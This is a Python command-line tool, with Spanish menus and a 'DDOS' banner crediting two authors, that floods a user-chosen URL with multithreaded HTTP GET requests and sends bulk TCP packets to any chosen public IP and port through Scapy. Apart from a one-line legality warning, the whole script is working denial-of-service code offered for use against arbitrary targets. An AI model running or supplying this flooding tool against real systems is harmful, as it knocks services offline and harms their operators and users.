#!/usr/bin/env python3

import os
import requests
import threading
import time
import signal
import sys
import scapy.all as scapy
from queue import Queue
from threading import Semaphore

# Colores para el texto
ROJO = '\033[91m'
VERDE = '\033[92m'
RESET = '\033[0m'

# Configuración de cabeceras para las solicitudes HTTP
CABECERAS = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8',
}

# Función para limpiar la pantalla
def limpiar_pantalla():
    os.system('clear')

# Banner con el nombre de los autores
def mostrar_banner():
    print(ROJO + r"""
ooooooooooo.   oooooooooo.     .oooooo.    .oooooo..o
`888'   `Y8b  `888'   `Y8b   d8P'  `Y8b  d8P'    `Y8
 888      888  888      888 888      888 888      888
 888      888  888      888 888      888  `"Y8888o.  
 888     d88'  888     d88' `88b    d88' oo     .d8P 
o888bood8P'   o888bood8P'    `Y8bood8P'  8""88888P'
""" + RESET)
    print(ROJO + "              (Jesús803576) (thefsg369)" + RESET)

# Menú principal
def mostrar_menu():
    mostrar_banner()
    print()
    print(VERDE + "=== Menú Principal ===" + RESET)
    print(VERDE + "1. DDoS" + RESET)
    print(VERDE + "2. Generar tráfico con Scapy" + RESET)
    print(VERDE + "3. Salir" + RESET)
    print(VERDE + "=" * 20 + RESET)

# Función para enviar solicitudes con control de hilos
def enviar_solicitud(url, cabeceras, sesion, semaforo, retardo):
    semaforo.acquire()
    try:
        respuesta = sesion.get(url, headers=cabeceras, timeout=5)
        print(f"Respuesta {respuesta.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    finally:
        semaforo.release()
        time.sleep(retardo)

# Función de la prueba DDoS
def prueba_ddos(url, num_solicitudes, hilos, retardo):
    sesion = requests.Session()
    cola = Queue()
    semaforo = Semaphore(hilos)

    # Llenar la cola con la URL a atacar
    for _ in range(num_solicitudes):
        cola.put(url)

    # Función para que cada hilo consuma la cola
    def worker():
        while not cola.empty():
            url = cola.get()
            enviar_solicitud(url, CABECERAS, sesion, semaforo, retardo)

    # Crear y ejecutar los hilos
    hilos_lista = []
    for _ in range(hilos):
        hilo = threading.Thread(target=worker)
        hilos_lista.append(hilo)
        hilo.start()

    # Medir el tiempo de ejecución
    tiempo_inicio = time.time()
    for hilo in hilos_lista:
        hilo.join()
    tiempo_final = time.time()

    print(f"Tiempo total: {tiempo_final - tiempo_inicio} segundos")

# Función para manejar la opción de DDoS
def opcion_ddos():
    limpiar_pantalla()
    mostrar_banner()

    print()
    print(ROJO + "ADVERTENCIA: Esta acción podría ser ilegal y tiene consecuencias serias." + RESET)

    url = input(VERDE + "Ingresa la URL objetivo: " + RESET)
    num_solicitudes = int(input(VERDE + "Número de solicitudes: " + RESET))
    hilos = int(input(VERDE + "Número de hilos: " + RESET))
    retardo = float(input(VERDE + "Retardo entre solicitudes (segundos): " + RESET))

    confirmacion = input(VERDE + "¿Estás seguro de continuar? (s/n): " + RESET)
    if confirmacion.lower() == 's':
        limpiar_pantalla()
        print(ROJO + "Ejecutando opción de DDoS..." + RESET)
        prueba_ddos(url, num_solicitudes, hilos, retardo)
    else:
        print(VERDE + "Acción cancelada." + RESET)

    input(VERDE + "Presiona Enter para volver al menú: " + RESET)

# Función para generar tráfico con Scapy, permitiendo IPs públicas
def generar_trafico():
    limpiar_pantalla()
    mostrar_banner()

    print()
    print(ROJO + "Generando tráfico con Scapy..." + RESET)
    
    # Solicitar la IP pública del objetivo
    ip_objetivo = input(VERDE + "Ingresa la IP objetivo: " + RESET)
    puerto_objetivo = int(input(VERDE + "Ingresa el puerto objetivo: " + RESET))
    num_paquetes = int(input(VERDE + "Ingresa el número de paquetes: " + RESET))

    # Construir el paquete con Scapy
    packet = scapy.IP(dst=ip_objetivo)/scapy.TCP(dport=puerto_objetivo)
    
    # Imprimir detalles del tráfico para verificación
    print(VERDE + f"Enviando {num_paquetes} paquetes a {ip_objetivo} en el puerto {puerto_objetivo}" + RESET)
    
    try:
        # Enviar el tráfico con permisos root
        scapy.send(packet, count=num_paquetes)
        print(VERDE + "Tráfico generado con éxito." + RESET)
    except PermissionError:
        print(ROJO + "Error: Debes ejecutar el script con permisos de root (usa 'sudo')." + RESET)
    
    input(VERDE + "Presiona Enter para volver al menú: " + RESET)

# Manejo de salida segura
def manejar_salida(signal, frame):
    print(VERDE + "\nHasta la próxima." + RESET)
    sys.exit(0)

# Función principal
def main():
    signal.signal(signal.SIGINT, manejar_salida)
    while True:
        limpiar_pantalla()
        mostrar_menu()

        opcion = input(VERDE + "Selecciona una opción (1-3): " + RESET)

        if opcion == '1':
            limpiar_pantalla()
            opcion_ddos()
        elif opcion == '2':
            limpiar_pantalla()
            generar_trafico()
        elif opcion == '3':
            limpiar_pantalla()
            print(VERDE + "Saliendo..." + RESET)
            break
        else:
            print(ROJO + "Opción no válida. Por favor, intenta de nuevo." + RESET)

if __name__ == "__main__":
    main()
